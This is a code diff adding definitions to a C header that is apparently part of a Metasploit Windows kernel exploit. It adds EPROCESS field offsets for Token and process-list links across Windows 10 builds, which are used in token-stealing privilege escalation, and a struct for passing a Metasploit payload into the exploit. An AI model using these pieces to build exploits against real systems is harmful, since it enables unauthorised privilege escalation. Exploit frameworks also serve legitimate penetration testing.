@@ -28,3 +28,25 @@ static _inline void real_dprintf(char* format, ...)
 	OutputDebugStringA(buffer);
 	va_end(args);
 }
+
+typedef struct _EPROCESS_OFFSETS {
+	WORD ActiveProcessLinks;
+	WORD Token;
+	WORD UniqueProcessId;
+} EPROCESS_OFFSETS;
+typedef EPROCESS_OFFSETS* PEPROCESS_OFFSETS;
+
+const static EPROCESS_OFFSETS EprocessOffsetsWin10v1803 = { 0x2f0, 0x360, 0x2e8 }; /* Windows 10 v1803 - v1909 */
+const static EPROCESS_OFFSETS EprocessOffsetsWin10v2004 = { 0x448, 0x4b8, 0x440 }; /* Windows 10 v2004 - v20H2 */
+
+/*
+ * This struct makes the exploit compatible with a Metasploit payload of an arbitrary as constructed using something like:
+ *
+ * encoded_payload = payload.encoded
+ * [encoded_payload.length].pack('I<') + encoded_payload
+ */
+typedef struct _MSF_PAYLOAD {
+	DWORD  dwSize;
+	CHAR  cPayloadData[];
+} MSF_PAYLOAD;
+typedef MSF_PAYLOAD* PMSF_PAYLOAD;
